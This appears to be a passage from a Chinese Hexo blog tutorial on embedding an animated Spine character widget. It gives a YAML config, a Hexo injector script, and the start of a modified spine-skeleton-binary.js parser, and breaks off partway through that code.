yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">myspine:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#是否启用</span></span><br><span class="line">  <span class="attr">spineDir:</span> <span class="string">&quot;/spine_models/&quot;</span> <span class="comment">#spine模型存放的主目录，上面说的新建的spine_models</span></span><br><span class="line">  <span class="attr">models:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;sd_21miku_normal_r/&quot;</span> <span class="comment">#模型存放子文件夹名（末尾一定要带斜杠）</span></span><br><span class="line">      <span class="attr">skin:</span> <span class="string">&quot;default&quot;</span> <span class="comment">#使用的皮肤</span></span><br><span class="line">      <span class="attr">atlas:</span> <span class="string">&quot;sekai_atlas.atlas&quot;</span> <span class="comment">#atlas文件的url</span></span><br><span class="line">      <span class="attr">skeleton:</span> <span class="string">&quot;sekai_atlas.skel&quot;</span> <span class="comment">#skeleton文件的url</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;model_example/&quot;</span> <span class="comment">#可增加多个模型</span></span><br><span class="line">      <span class="attr">skin:</span> <span class="string">&quot;model_example.skin&quot;</span></span><br><span class="line">      <span class="attr">atlas:</span> <span class="string">&quot;model_example.atlas&quot;</span></span><br><span class="line">      <span class="attr">skeleton:</span> <span class="string">&quot;model_example.skel&quot;</span></span><br><span class="line">  <span class="attr">styles:</span></span><br><span class="line">    <span class="attr">widget:</span> <span class="comment">#展示窗口的样式，可以自行添加其他需要设置的CSS属性</span></span><br><span class="line">      <span class="attr">width:</span> <span class="string">&quot;200px&quot;</span></span><br><span class="line">      <span class="attr">height:</span> <span class="string">&quot;200px&quot;</span></span><br><span class="line">    <span class="attr">voiceText:</span> <span class="comment">#语音文字的样式，可以自行添加其他需要设置的CSS属性</span></span><br><span class="line">      <span class="attr">color:</span> <span class="string">&quot;#e6e6e6&quot;</span></span><br><span class="line">  <span class="attr">behaviors:</span></span><br><span class="line">    <span class="attr">start:</span> <span class="comment">#模型刚出现时触发的行为</span></span><br><span class="line">      <span class="attr">animation:</span> <span class="string">&quot;w_emu_run01_f&quot;</span> <span class="comment">#动画名称</span></span><br><span class="line">      <span class="attr">voice:</span> <span class="string">&quot;&quot;</span> <span class="comment">#音频的url，为空默认是default.mp3</span></span><br><span class="line">      <span class="attr">text:</span> <span class="string">&quot;Ohhhhh好耶&quot;</span> <span class="comment">#语音文字</span></span><br><span class="line">    <span class="attr">idle:</span> <span class="comment">#模型被闲置时触发的行为</span></span><br><span class="line">      <span class="attr">maxMinutes:</span> <span class="number">1</span> <span class="comment">#最大闲置时间，不够时间将循环播放当前动画，时间到达后将随机替换一个闲置动画</span></span><br><span class="line">      <span class="attr">animations:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;m_cool_idle01_f&quot;</span> <span class="comment">#动画名称，可增加多个动画</span></span><br><span class="line">          <span class="attr">loop:</span> <span class="literal">false</span> <span class="comment">#语音结束前是否循环播放</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;m_cool_joy01_f&quot;</span></span><br><span class="line">          <span class="attr">loop:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">voices:</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="attr">voice:</span> <span class="string">&quot;&quot;</span> <span class="comment">#同上，可增加多个语音</span></span><br><span class="line">          <span class="attr">text:</span> <span class="string">&quot;不买立省百分百&quot;</span> <span class="comment">#同上</span></span><br><span class="line">    <span class="attr">interact:</span> <span class="comment">#模型被点击时触发的行为</span></span><br><span class="line">      <span class="attr">maxPlaySec:</span> <span class="number">3</span> <span class="comment">#单个动画的最长播放时间，超过将直接停止播放</span></span><br><span class="line">      <span class="attr">animations:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;w_normal_joy01_b&quot;</span> <span class="comment">#同上</span></span><br><span class="line">          <span class="attr">loop:</span> <span class="literal">false</span> <span class="comment">#同上</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;m_cool_angry01_f&quot;</span></span><br><span class="line">          <span class="attr">loop:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">voices:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">voice:</span> <span class="string">&quot;&quot;</span> <span class="comment">#同上</span></span><br><span class="line">          <span class="attr">text:</span> <span class="string">&quot;既见未来，为何不buy&quot;</span> <span class="comment">#同上</span></span><br></pre></td></tr></table></figure><h1 id="使用Hexo自带的注入器"><a href="#使用Hexo自带的注入器" class="headerlink" title="使用Hexo自带的注入器"></a>使用Hexo自带的注入器</h1><p>将spine相关的html使用<a href="https://hexo.io/api/injector">Hexo Injector</a>注入到网页的body部分，将以下代码保存为<code>myspine-injector.js</code>，然后放在<strong>主题文件的源目录</strong>的<code>scripts</code>目录下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">hexo.extend.injector.register(<span class="string">&#x27;body_end&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;</span><br><span class="line">        enable,</span><br><span class="line">        spineDir,</span><br><span class="line">        models,</span><br><span class="line">        styles,</span><br><span class="line">        behaviors</span><br><span class="line">    &#125; = hexo.config.myspine;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!enable) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;myspine-spine-widget&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;/js/third-party/myspine/spine-widget.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;/js/third-party/myspine/spine-skeleton-binary.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;/js/third-party/myspine/myspine.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;link type=&quot;text/css&quot; href=&quot;/css/_third-party/myspine.css&quot;&gt;&lt;/link&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">        new MySpine(&#123;</span></span><br><span class="line"><span class="string">            spineDir: &quot;<span class="subst">$&#123;spineDir&#125;</span>&quot;,</span></span><br><span class="line"><span class="string">            models: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(models)&#125;</span>,</span></span><br><span class="line"><span class="string">            styles: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(styles)&#125;</span>,</span></span><br><span class="line"><span class="string">            behaviors: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(behaviors)&#125;</span></span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211102194050555.png"></p><h1 id="spine引擎"><a href="#spine引擎" class="headerlink" title="spine引擎"></a>spine引擎</h1><p>在<strong>主题文件的源目录</strong>的<code>source/js/third-party/myspine</code>路径下放置<strong>对应spine版本</strong>的<code>spine-widget.js</code>和<code>spine-skeleton-binary.js</code>。</p><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211102195054233.png"></p><h2 id="spine-widget-js"><a href="#spine-widget-js" class="headerlink" title="spine-widget.js"></a>spine-widget.js</h2><p>比如3.6.53版本的可以在<a href="https://github.com/EsotericSoftware/spine-runtimes/blob/3.6.53/spine-ts/build/spine-widget.js">https://github.com/EsotericSoftware/spine-runtimes/blob/3.6.53/spine-ts/build/spine-widget.js</a>里下载。</p><p>不同版本的spine改中间的版本号就行。</p><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211102195156304.png"></p><h2 id="spine-skeleton-binary-js"><a href="#spine-skeleton-binary-js" class="headerlink" title="spine-skeleton-binary.js"></a>spine-skeleton-binary.js</h2><p>这个我死活找不到按版本号分类的，参考文章里给的是3.5.51版的<code>spine-skeleton-binary.js</code>。</p><p>鉴于这个文件是用来解析skel文件二进制的，逆向手思索了一下，突然反应过来Skeleton Viewer不也是解析skel文件二进制诶，那不如……用jd-gui逆了一下<code>skeletonViewer-3.6.53.jar</code>和<code>skeletonViewer-3.5.51.jar</code>，对比发现3.6.53多了点东西，在原js的基础上加了对应的解析就可了。</p><p>更改后3.6.53版本的<code>spine-skeleton-binary.js</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">spine</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> BlendMode = [<span class="string">&quot;normal&quot;</span>, <span class="string">&quot;additive&quot;</span>, <span class="string">&quot;multiply&quot;</span>, <span class="string">&quot;screen&quot;</span>];</span><br><span class="line">    <span class="keyword">let</span> AttachmentType = [<span class="string">&quot;region&quot;</span>, <span class="string">&quot;boundingbox&quot;</span>, <span class="string">&quot;mesh&quot;</span>, <span class="string">&quot;linkedmesh&quot;</span>, <span class="string">&quot;path&quot;</span>, <span class="string">&quot;point&quot;</span>, <span class="string">&quot;clipping&quot;</span>];</span><br><span class="line">    <span class="keyword">let</span> TransformMode = [<span class="string">&quot;normal&quot;</span>, <span class="string">&quot;onlyTranslation&quot;</span>, <span class="string">&quot;noRotationOrReflection&quot;</span>, <span class="string">&quot;noScale&quot;</span>, <span class="string">&quot;noScaleOrReflection&quot;</span>];</span><br><span class="line">    <span class="keyword">let</span> PositionMode = [<span class="string">&quot;fixed&quot;</span>, <span class="string">&quot;percent&quot;</span>];</span><br><span class="line">    <span class="keyword">let</span> SpacingMode = [<span class="string">&quot;length&quot;</span>, <span class="string">&quot;fixed&quot;</span>, <span class="string">&quot;percent&quot;</span>];</span><br><span class="line">    <span class="keyword">let</span> RotateMode = [<span class="string">&quot;tangent&quot;</span>, <span class="string">&quot;chain&quot;</span>, <span class="string">&quot;chainScale&quot;</span>];</span><br><span class="line"></span><br><span class="line">    spine.SkeletonJsonConverter = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">SkeletonJsonConverter</span>(<span class="params">data, scale = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">            <span class="built_in">this</span>.scale = scale;</span><br><span class="line">            <span class="built_in">this</span>.nextNum = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">this</span>.chars = <span class="literal">null</span>;</span><br><span class="line">            <span 